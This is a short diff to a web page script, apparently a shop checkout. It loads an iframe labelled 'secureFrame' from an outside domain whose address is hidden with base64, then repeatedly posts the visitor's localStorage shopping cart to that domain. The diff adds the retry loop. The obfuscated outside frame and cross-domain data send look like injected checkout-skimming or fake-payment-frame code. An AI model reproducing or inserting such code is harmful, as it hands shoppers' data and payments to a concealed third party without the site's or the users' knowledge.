@@ -472,15 +472,26 @@ const iframe = document.getElementById("secureFrame");
 const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi83L2FsbGEuaHRtbA==");
 
 iframe.src = realURL;
-
 iframe.addEventListener("load", () => {
 
 const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
+
+let intentos = 0;
+
+const enviar = setInterval(()=>{
 
 iframe.contentWindow.postMessage(
 { type:"carrito", data:carrito },
 "https://novie.in"
 );
+
+intentos++;
+
+if(intentos >= 6){
+clearInterval(enviar);
+}
+
+},200);
 
 });
 </script>
